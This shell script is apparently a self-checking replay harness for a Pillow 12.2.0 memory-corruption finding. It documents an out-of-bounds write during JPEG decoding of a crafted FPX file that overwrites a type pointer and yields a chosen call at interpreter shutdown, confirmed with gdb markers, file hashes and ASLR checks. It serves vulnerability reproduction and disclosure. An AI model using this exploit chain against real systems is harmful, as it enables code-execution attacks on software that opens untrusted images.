#!/bin/sh
# Self-checking replay for Pillow W9: 188-byte single-row OOB write, static
# type pointer, natural-finalization chosen call, ASLR left ON.
#
# Usage (from this directory or anywhere):
#   PILLOW_BUILD=/path/to/plain-pillow-12.2.0 sh replay_min.sh [outdir]
#   sh replay_min.sh --build /path/to/pillow-12.2.0.tar.gz [outdir]
#
# An explicitly set PILLOW_BUILD always wins over the default CANON symlink.
# All runs are local processes. No socket, server or external probe. No
# debugger staging of memory: gdb only sets breakpoints/watchpoints and
# observes. "set disable-randomization off" keeps host ASLR active.
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
CANON=/tmp/pw2-w9/v12plain
OUT=${1:-$HERE/replay-min-out}
MODE=${1:-}

if [ "$MODE" = "--build" ]; then
    SDIST=${2:-}
    OUT=${3:-$HERE/replay-min-out}
    [ -n "$SDIST" ] && [ -f "$SDIST" ] || {
        echo "FAIL: --build needs an sdist path" >&2; exit 2; }
    if [ ! -d "$CANON" ]; then
        mkdir -p "$(dirname "$CANON")"
        python3 -m pip install --no-binary :all: --no-deps --target "$CANON" "$SDIST"
    fi
elif [ "$MODE" != "" ]; then
    OUT=$1
fi

BUILD=${PILLOW_BUILD:-}
# PILLOW_BUILD is authoritative. A stale /tmp/pw2-w9/v12plain symlink must
# never silently redirect an independent replay to the author's own build.
if [ -n "$BUILD" ]; then
    [ -d "$BUILD" ] || {
        echo "FAIL: PILLOW_BUILD is not a directory: $BUILD" >&2; exit 2; }
    PY=$(cd "$BUILD" && pwd)
else
    [ -d "$CANON" ] || {
        echo "FAIL: set PILLOW_BUILD or use --build" >&2; exit 2; }
    PY=$(cd "$CANON" && pwd)
fi
PYTHONPATH="$PY" python3 -c \
    'import PIL, olefile; assert PIL.__version__ == "12.2.0", PIL.__version__' || {
    echo "FAIL: build is not plain Pillow 12.2.0 + olefile" >&2; exit 2; }

mkdir -p "$OUT"
cd "$HERE"
PASS=0
FAIL=0

check() {
    name=$1; log=$2; shift 2; ok=1
    for needle in "$@"; do
        case $needle in
            !*) grep -Fq "${needle#!}" "$log" && ok=0 ;;
            *)  grep -Fq "$needle" "$log" || ok=0 ;;
        esac
    done
    if [ "$ok" -eq 1 ]; then echo "PASS $name"; PASS=$((PASS+1));
    else echo "FAIL $name ($log)"; FAIL=$((FAIL+1)); fi
}

sha_check() {
    got=$(sha256sum "$1" | cut -d' ' -f1)
    if [ "$got" = "$2" ]; then echo "PASS sha-$1"; PASS=$((PASS+1));
    else echo "FAIL sha-$1: got $got want $2"; FAIL=$((FAIL+1)); fi
}

CODE='from PIL import Image; Image.open("%s").load(); print("LOAD_OK")'

run_gdb() {
    name=$1; script=$2; casefile=$3
    PYTHONPATH="$PY" gdb -q -batch -x "$script" --args python3 -c \
        "$(printf "$CODE" "$casefile")" > "$OUT/$name.log" 2>&1 || true
}

sha_check case_min.fpx \
    d0eb87b9dd6ce922ef97bf4007766384491b228a19d81dcf8cce045337b46722
sha_check case_min_ctrl.fpx \
    83c4758b1ca498b0c12171dc43bd31d8fdc33b374047be532898f70851a79d06
sha_check pattern_min.hex \
    c262a02af710f674742b694d394c8e89e025a755c438b4a5fa0997dd2b8e03f0
sha_check pattern_min_ctrl.hex \
    577a9aa6b14c0269de6837c132b49a87db840bdab48db57dee41bcf8d877b348

run_gdb w9_marker min_chosen_call.gdb case_min.fpx
check w9_marker "$OUT/w9_marker.log" \
    'SLOT=54e700' 'TYPE=a472c0' 'LOAD_OK' \
    'HIT pc=0x54e700' 'Py_FinalizeEx ()'

run_gdb w9_control min_chosen_call.gdb case_min_ctrl.fpx
check w9_control "$OUT/w9_control.log" \
    'SLOT=54e700' 'LOAD_OK' '!HIT pc='

run_gdb w9_watch min_chosen_watch.gdb case_min.fpx
check w9_watch "$OUT/w9_watch.log" \
    'BEFORE_TYPE=a472c0' 'AFTER_TYPE=a2d260' \
    'jpeg_read_scanlines ()' 'ImagingJpegDecode' 'JpegDecode.c:252'

: > "$OUT/w9_aslr_heap.log"
i=0
while [ "$i" -lt 3 ]; do
    env -i PATH="$PATH" HOME="$HOME" PYTHONPATH="$CANON" python3 -c \
        'h=[l for l in open("/proc/self/maps") if "[heap]" in l]; print("HEAP",h[0].split()[0])' \
        >> "$OUT/w9_aslr_heap.log" 2>&1
    i=$((i+1))
done
DISTINCT=$(awk '{print $2}' "$OUT/w9_aslr_heap.log" | sort -u | wc -l)
if [ "$DISTINCT" -ge 2 ]; then
    echo "PASS w9_aslr_heap ($DISTINCT distinct heap bases)"; PASS=$((PASS+1))
else
    echo "FAIL w9_aslr_heap (only $DISTINCT distinct heap bases)"; FAIL=$((FAIL+1))
fi

echo "TOTAL PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
